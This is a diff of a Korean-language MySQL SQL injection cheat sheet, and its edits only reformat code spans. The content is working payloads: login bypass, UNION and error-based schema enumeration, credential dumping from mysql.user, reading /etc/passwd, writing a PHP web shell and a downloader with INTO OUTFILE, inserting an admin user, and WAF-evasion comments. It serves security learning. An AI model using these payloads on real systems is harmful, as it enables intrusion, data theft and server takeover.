@@ -84,8 +84,8 @@ AND false&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;거짓<br>
 
 
 예 :<br>
-`SELECT * FROM Users WHERE username = '' OR 1=1 -- -' AND password = '';<br>
-SELECT * FROM Users WHERE id = '' UNION SELECT 1, 2, 3`';`<br><br>
+`SELECT * FROM Users WHERE username = '' OR 1=1 -- -' AND password = '';`<br>
+`SELECT * FROM Users WHERE id = '' UNION SELECT 1, 2, 3`';`<br><br>
 
 노트 :<br>
 별칭으로 사용할 때 Backtick 연산자(`)는 쿼리를 종료할 때만 사용할 수 있음.<br><br><br>
@@ -96,9 +96,9 @@ SELECT * FROM Users WHERE id = '' UNION SELECT 1, 2, 3`';`<br><br>
 
 **① 변수**<br><br>
 
-`VERSION()<br>
-@@VERSION<br>
-@@GLOBAL.VERSION`<br><br>
+`VERSION()`<br>
+`@@VERSION`<br>
+`@@GLOBAL.VERSION`<br><br>
 
 예 :<br>
 `SELECT * FROM Users WHERE id = '1' AND MID(VERSION(),1,1) = '5';`<br><br>
@@ -125,24 +125,22 @@ MySQL 특정 코드에 대한 자세한 내용은 아래 ( 19 ) MySQL 특정 코
 
 
 ## (5) 데이터베이스 자격 증명
-<br>
 ![스크린샷 2024-04-17 오후 2 11 30](https://github.com/ICTIS-Cert-System-Project/ICTIS-Cert-System/assets/18510716/e5b243ae-9d8b-4832-a736-686d08842495)<br><br>
 
 
 예 :<br>
-`SELECT current_user;<br>
-SELECT CONCAT_WS(0x3A, user, password) FROM mysql.user WHERE user = 'root'-- (Privileged)`<br><br><br>
+`SELECT current_user;`<br>
+`SELECT CONCAT_WS(0x3A, user, password) FROM mysql.user WHERE user = 'root'-- (Privileged)`<br><br><br>
 
 
 
 ## (6) 데이터베이스 이름
-<br>
 ![스크린샷 2024-04-17 오후 2 13 29](https://github.com/ICTIS-Cert-System-Project/ICTIS-Cert-System/assets/18510716/e9f4c5b6-d7d0-44c9-b63b-140980ec3b29)<br><br>
 
 예 :<br>
-`SELECT database();<br>
-SELECT schema_name FROM information_schema.schemata;<br>
-SELECT DISTINCT(db) FROM mysql.db;-- (Privileged)`<br><br><br>
+`SELECT database();`<br>
+`SELECT schema_name FROM information_schema.schemata;`<br>
+`SELECT DISTINCT(db) FROM mysql.db;-- (Privileged)`<br><br><br>
 
 
 
@@ -185,11 +183,11 @@ GROUP BY 와 ORDER BY 는 SQL 에서 다른 기능을 가지고 있지만 정확
 예 : <br>
 `주어진 쿼리 SELECT username, password, permission FROM Users WHERE id = '{INJECTION POINT}';`<br><br>
 
-`1' ORDER BY 1--+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;참`<br>
-`1' ORDER BY 2--+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;참`<br>
-`1' ORDER BY 3--+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;참`<br>
-`1' ORDER BY 4--+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;거짓 - 쿼리는 3 개의 컬럼만 사용함.`<br>
-`-1' UNION SELECT 1,2,3--+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;참`<br><br>
+1' ORDER BY 1--+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;참<br>
+1' ORDER BY 2--+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;참<br>
+1' ORDER BY 3--+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;참<br>
+1' ORDER BY 4--+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;거짓 - 쿼리는 3 개의 컬럼만 사용함.<br>
+-1' UNION SELECT 1,2,3--+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;참<br><br>
 
 ⓑ 에러 기반(Error Based)1<br><br>
 
@@ -215,15 +213,15 @@ SELECT ... INTO var_list, var_list1, var_list2...<br><br>
 예1 :<br>
 `주어진 쿼리 SELECT permission FROM Users WHERE id = {INJECTION POINT};`<br><br>
 
-`-1 UNION SELECT 1 INTO @,@,@&nbsp;&nbsp;사용된 SELECT 문은 다른 컬럼 수를 가짐.<br>
--1 UNION SELECT 1 INTO @,@&nbsp;&nbsp;&nbsp;&nbsp;사용된 SELECT 문은 다른 컬럼 수를 가짐.<br>
--1 UNION SELECT 1 INTO @&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;에러가 없다는 건 컬럼 1개를 사용함을 의미함.`<br><br>
+`-1 UNION SELECT 1 INTO @,@,@&nbsp;&nbsp;사용된 SELECT 문은 다른 컬럼 수를 가짐.`<br>
+`-1 UNION SELECT 1 INTO @,@&nbsp;&nbsp;&nbsp;&nbsp;사용된 SELECT 문은 다른 컬럼 수를 가짐.`<br>
+`-1 UNION SELECT 1 INTO @&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;에러가 없다는 건 컬럼 1개를 사용함을 의미함.`<br><br>
 
 예2 :<br>
 `주어진 쿼리 SELECT username, permission FROM Users limit 1,{INJECTION POINT};`<br><br>
 
-`1 INTO @,@,@&nbsp;&nbsp;&nbsp;&nbsp;사용된 SELECT 문은 다른 컬럼 수를 가짐.<br>
-1 INTO @,@&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;에러가 없다는 건 컬럼 2개를 사용함을 의미함.<br><br>`
+`1 INTO @,@,@&nbsp;&nbsp;&nbsp;&nbsp;사용된 SELECT 문은 다른 컬럼 수를 가짐.`<br>
+`1 INTO @,@&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;에러가 없다는 건 컬럼 2개를 사용함을 의미함.`<br><br>
 
 ⓓ 에러 기반3<br><br>
 
@@ -236,7 +234,7 @@ SELECT ... INTO var_list, var_list1, var_list2...<br><br>
 예 :<br>
 `주어진 쿼리 SELECT permission FROM Users WHERE id = {INJECTION POINT};`<br><br>
 
-`1 AND (SELECT * FROM Users) = 1&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;피연산자는 3개의 컬럼을 포함해야 함.`<br><br>
+1 AND (SELECT * FROM Users) = 1&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;피연산자는 3개의 컬럼을 포함해야 함.<br><br>
 
 **② 테이블 검색**<br><br>
 
@@ -262,11 +260,11 @@ substr("문자열", 자르기 시작할 문자의 인덱스, 자를 문자의 �
 
 ⓒ Error<br><br>
 
-`AND(SELECT COUNT(*) FROM (SELECT 1 UNION SELECT null UNION SELECT !1)x GROUP BY CONCAT((SELECT table_name FROM information_schema.tables LIMIT 1),FLOOR(RAND(0)*2)))<br><br>
+`AND(SELECT COUNT(*) FROM (SELECT 1 UNION SELECT null UNION SELECT !1)x GROUP BY CONCAT((SELECT table_name FROM information_schema.tables LIMIT 1),FLOOR(RAND(0)*2)))`<br><br>
 
-(@:=1)||@ GROUP BY CONCAT((SELECT table_name FROM information_schema.tables LIMIT 1),!@) HAVING @||MIN(@:=0);<br><br>
+`(@:=1)||@ GROUP BY CONCAT((SELECT table_name FROM information_schema.tables LIMIT 1),!@) HAVING @||MIN(@:=0);`<br><br>
 
-AND ExtractValue(1, CONCAT(0x5c, (SELECT table_name FROM information_schema.tables LIMIT 1)));-- Available in 5.1.5`<br><br>
+`AND ExtractValue(1, CONCAT(0x5c, (SELECT table_name FROM information_schema.tables LIMIT 1)));-- Available in 5.1.5`<br><br>
 
 노트 :<br>
 MySQL 5 의 경우 version = 10 임.<br>
@@ -283,17 +281,17 @@ MySQL 5 의 경우 version = 10 임.<br>
 
 ⓒ Error<br><br>
 
-`AND(SELECT COUNT(*) FROM (SELECT 1 UNION SELECT null UNION SELECT !1)x GROUP BY CONCAT((SELECT column_name FROM information_schema.columns LIMIT 1),FLOOR(RAND(0)*2)))<br><br>
+`AND(SELECT COUNT(*) FROM (SELECT 1 UNION SELECT null UNION SELECT !1)x GROUP BY CONCAT((SELECT column_name FROM information_schema.columns LIMIT 1),FLOOR(RAND(0)*2)))`<br><br>
 
-(@:=1)||@ GROUP BY CONCAT((SELECT column_name FROM information_schema.columns LIMIT 1),!@) HAVING @||MIN(@:=0);<br><br>
+`(@:=1)||@ GROUP BY CONCAT((SELECT column_name FROM information_schema.columns LIMIT 1),!@) HAVING @||MIN(@:=0);`<br><br>
 
-AND ExtractValue(1, CONCAT(0x5c, (SELECT column_name FROM information_schema.columns LIMIT 1)));-- Available in MySQL 5.1.5<br><br>
+`AND ExtractValue(1, CONCAT(0x5c, (SELECT column_name FROM information_schema.columns LIMIT 1)));-- Available in MySQL 5.1.5`<br><br>
 
-AND (1,2,3) = (SELECT * FROM SOME_EXISTING_TABLE UNION SELECT 1,2,3 LIMIT 1)-- Fixed in MySQL 5.1<br><br>
+`AND (1,2,3) = (SELECT * FROM SOME_EXISTING_TABLE UNION SELECT 1,2,3 LIMIT 1)-- Fixed in MySQL 5.1`<br><br>
 
-AND (SELECT * FROM (SELECT * FROM SOME_EXISTING_TABLE JOIN SOME_EXISTING_TABLE b) a)<br><br>
+`AND (SELECT * FROM (SELECT * FROM SOME_EXISTING_TABLE JOIN SOME_EXISTING_TABLE b) a)`<br><br>
 
-AND (SELECT * FROM (SELECT * FROM SOME_EXISTING_TABLE JOIN SOME_EXISTING_TABLE b USING (SOME_EXISTING_COLUMN)) a)`<br><br>
+`AND (SELECT * FROM (SELECT * FROM SOME_EXISTING_TABLE JOIN SOME_EXISTING_TABLE b USING (SOME_EXISTING_COLUMN)) a)`<br><br>
 
 ⓓ PROCEDURE ANALYSE()<br><br>
 
@@ -306,9 +304,9 @@ PROCEDURE ANALYSE() 함수는 MySQL 3.23.x 이상 버전에서 사용 가능한 
 예 :<br>
 `주어진 쿼리 SELECT username, permission FROM Users WHERE id = 1;`<br><br>
 
-`1 PROCEDURE ANALYSE()&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;첫 번째 컬럼의 이름 가져오기<br>
+1 PROCEDURE ANALYSE()&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;첫 번째 컬럼의 이름 가져오기<br>
 1 LIMIT 1,1 PROCEDURE ANALYSE()&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;두 번째 컬럼의 이름 가져오기<br>
-1 LIMIT 2,1 PROCEDURE ANALYSE()&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;세 번째 컬럼의 이름 가져오기`<br><br>
+1 LIMIT 2,1 PROCEDURE ANALYSE()&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;세 번째 컬럼의 이름 가져오기<br><br>
 
 ④ 한 번에 여러 테이블/컬럼 검색<br><br>
 
@@ -318,15 +316,15 @@ PROCEDURE ANALYSE() 함수는 MySQL 3.23.x 이상 버전에서 사용 가능한 
 `SELECT * FROM Users WHERE id = '-1' UNION SELECT 1, 2, (SELECT (@) FROM (SELECT(@:=0x00),(SELECT (@) FROM (information_schema.columns) WHERE (table_schema>=@) AND (@)IN (@:=CONCAT(@,0x0a,' [ ',table_schema,' ] >',table_name,' > ',column_name))))x), 4--+';`<br><br>
 
 결과값 :<br>
-`[ information_schema ] >CHARACTER_SETS > CHARACTER_SET_NAME<br>
-[ information_schema ] >CHARACTER_SETS > DEFAULT_COLLATE_NAME<br>
-[ information_schema ] >CHARACTER_SETS > DESCRIPTION<br>
-[ information_schema ] >CHARACTER_SETS > MAXLEN<br>
-[ information_schema ] >COLLATIONS > COLLATION_NAME<br>
-[ information_schema ] >COLLATIONS > CHARACTER_SET_NAME<br>
-[ information_schema ] >COLLATIONS > ID<br>
-[ information_schema ] >COLLATIONS > IS_DEFAULT<br>
-[ information_schema ] >COLLATIONS > IS_COMPILED`<br><br>
+`[ information_schema ] >CHARACTER_SETS > CHARACTER_SET_NAME`<br>
+`[ information_schema ] >CHARACTER_SETS > DEFAULT_COLLATE_NAME`<br>
+`[ information_schema ] >CHARACTER_SETS > DESCRIPTION`<br>
+`[ information_schema ] >CHARACTER_SETS > MAXLEN`<br>
+`[ information_schema ] >COLLATIONS > COLLATION_NAME`<br>
+`[ information_schema ] >COLLATIONS > CHARACTER_SET_NAME`<br>
+`[ information_schema ] >COLLATIONS > ID`<br>
+`[ information_schema ] >COLLATIONS > IS_DEFAULT`<br>
+`[ information_schema ] >COLLATIONS > IS_COMPILED`<br><br>
 
 `SELECT MID(GROUP_CONCAT(0x3c62723e, 0x5461626c653a20, table_name, 0x3c62723e, 0x436f6c756d6e3a20, column_name ORDER BY (SELECT version FROM information_schema.tables) SEPARATOR 0x3c62723e),1,1024) FROM information_schema.columns`<br><br>
 
@@ -385,8 +383,8 @@ CONCAT_WS()의 첫 번째 인수는 나머지 인수에 대한 구분 기호를 
 ![스크린샷 2024-04-17 오후 2 26 37](https://github.com/ICTIS-Cert-System-Project/ICTIS-Cert-System/assets/18510716/47812b85-e77c-4619-89a4-205f2563b685)<br><br>
 
 예 :<br>
-`SELECT IF(1=1, true, false);<br>
-SELECT CASE WHEN 1=1 THEN true ELSE false END;`<br><br><br>
+`SELECT IF(1=1, true, false);`<br>
+`SELECT CASE WHEN 1=1 THEN true ELSE false END;`<br><br><br>
 
 
 
@@ -417,8 +415,8 @@ SELECT CASE WHEN 1=1 THEN true ELSE false END;`<br><br><br>
 `LOAD_FILE()`<br><br>
 
 예 :<br>
-`SELECT LOAD_FILE('/etc/passwd');<br>
-SELECT LOAD_FILE(0x2F6574632F706173737764);`<br><br>
+`SELECT LOAD_FILE('/etc/passwd');`<br>
+`SELECT LOAD_FILE(0x2F6574632F706173737764);`<br><br>
 
 노트 :<br>
 파일은 서버 호스트에 있어야 함.<br>
@@ -436,15 +434,15 @@ LOAD_FILE() 에 대한 basedirectory 는 @@datadir 임.<br>
 `INTO OUTFILE/DUMPFILE`<br><br>
 
 예 :<br>
-`PHP 쉘을 작성하려면 :<br>
-SELECT '<? system($_GET[\'c\']); ?>' INTO OUTFILE '/var/www/shell.php';<br>
-다음 위치에서 액세스하십시오 :<br>
-hxxp://localhost/shell.php?c=cat%20/etc/passwd`<br><br>
+`PHP 쉘을 작성하려면 :`<br>
+`SELECT '<? system($_GET[\'c\']); ?>' INTO OUTFILE '/var/www/shell.php';`<br>
+`다음 위치에서 액세스하십시오 :`<br>
+`hxxp://localhost/shell.php?c=cat%20/etc/passwd`<br><br>
 
-`다운로더를 작성하려면 :<br>
-SELECT '<? fwrite(fopen($_GET[f], \'w\'), file_get_contents($_GET[u])); ?>' INTO OUTFILE '/var/www/get.php'<br><br>
-다음 위치에서 액세스하십시오 :<br>
-hxxp://localhost/get.php?f=shell.php&u=http://localhost/c99.txt`<br><br>
+`다운로더를 작성하려면 :`<br>
+`SELECT '<? fwrite(fopen($_GET[f], \'w\'), file_get_contents($_GET[u])); ?>' INTO OUTFILE '/var/www/get.php'`<br><br>
+`다음 위치에서 액세스하십시오 :`<br>
+`hxxp://localhost/get.php?f=shell.php&u=http://localhost/c99.txt`<br><br>
 
 노트 :<br>
 파일은 INTO OUTFILE 로 겹쳐 쓸 수 없음.<br>
@@ -473,8 +471,8 @@ PDO_MYSQL 드라이버는 누적된 쿼리(Stacked Queries)를 지원함.<br>
 MySQLi (Improved Extension) 드라이버는 multi_query() 함수를 통해 누적된 쿼리(Stacked Queries)를 지원함.<br><br>
 
 예 :<br>
-`SELECT * FROM Users WHERE ID=1 AND 1=0; INSERT INTO Users(username, password, priv) VALUES ('BobbyTables', 'kl20da$$','admin');<br>
-SELECT * FROM Users WHERE ID=1 AND 1=0; SHOW COLUMNS FROM Users;`<br><br><br>
+`SELECT * FROM Users WHERE ID=1 AND 1=0; INSERT INTO Users(username, password, priv) VALUES ('BobbyTables', 'kl20da$$','admin');`<br>
+`SELECT * FROM Users WHERE ID=1 AND 1=0; SHOW COLUMNS FROM Users;`<br><br><br>
 
 
 
@@ -484,8 +482,8 @@ MySQL 에서는 느낌표 뒤에 버전 번호를 지정할 수 있음.<br>
 주석의 구문은 버전이 지정된 버전 번호보다 크거나 같으면 실행됨.<br><br>
 
 예 :<br>
-`UNION SELECT /*!50000 5,null;*//*!40000 4,null-- ,*//*!30000 3,null-- x*/0,null--+<br>
-SELECT 1/*!41320UNION/*!/*!/*!00000SELECT/*!/*!USER/*!(/*!/*!/*!*/);`<br><br>
+`UNION SELECT /*!50000 5,null;*//*!40000 4,null-- ,*//*!30000 3,null-- x*/0,null--+`<br>
+`SELECT 1/*!41320UNION/*!/*!/*!00000SELECT/*!/*!USER/*!(/*!/*!/*!*/);`<br><br>
 
 노트 :<br>
 첫 번째 예제는 버전을 반환함. 2개의 컬럼이 있는 UNION 을 사용함.<br>
@@ -530,10 +528,10 @@ WAF/IDS 를 우회하기 위해 주석을 사용하여 쿼리를 분할할 수 �
 <p># 또는 -- 와 같은 개행 문자를 사용하여 쿼리를 별도의 줄로 나눌 수 있음.</p><br><br>
 
 예 :<br>
-`1'#<br>
-AND 0--<br>
-UNION# I am a comment!<br>
-SELECT@tmp:=table_name x FROM--<br>
+`1'#`<br>
+`AND 0--`<br>
+`UNION# I am a comment!`<br>
+`SELECT@tmp:=table_name x FROM--`<br>
 `information_schema`.tables LIMIT 1#`<br><br>
 
 URL 인코딩은 다은과 같이 나타냄 :<br>
